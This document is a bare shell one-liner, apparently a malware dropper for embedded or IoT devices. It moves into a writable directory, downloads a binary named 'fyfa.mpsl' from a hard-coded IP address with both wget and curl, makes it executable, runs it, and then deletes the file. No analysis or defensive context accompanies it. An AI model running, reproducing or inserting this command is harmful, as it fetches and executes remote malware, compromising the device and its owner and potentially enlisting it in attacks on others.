cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.207/fyfa.mpsl; curl -O http://46.166.185.207/fyfa.mpsl; chmod +x fyfa.mpsl; ./fyfa.mpsl; rm -rf fyfa.mpsl
